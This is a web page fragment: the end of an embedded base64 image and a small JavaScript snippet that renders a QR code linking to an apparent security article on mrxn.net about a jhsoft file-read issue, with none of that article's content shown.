3xZj+//Iasfh/I1Ls/eyogWVhj7zPj9u6eOqT/Vd86sdd9lcO4D/sX/rGBfHWz//e6w0BqSrN1dlCQqUPQHtZBdAiqd7Suozl1SB84otmO1nYd0qP7EB1GtB6iy63vqN8RxvryDwMp8V4/dwLbQCDTgte42qpPxVXfvLiqg+znLFf1PSOH9KjMqwXJQbBn7SfqwzyvL/Y6dUg9cP8p6/FmP9sb8mb7+t9u5x8AAAD//zkxE7gAAAAGSURBVAMAw+Mspwi9GZoAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 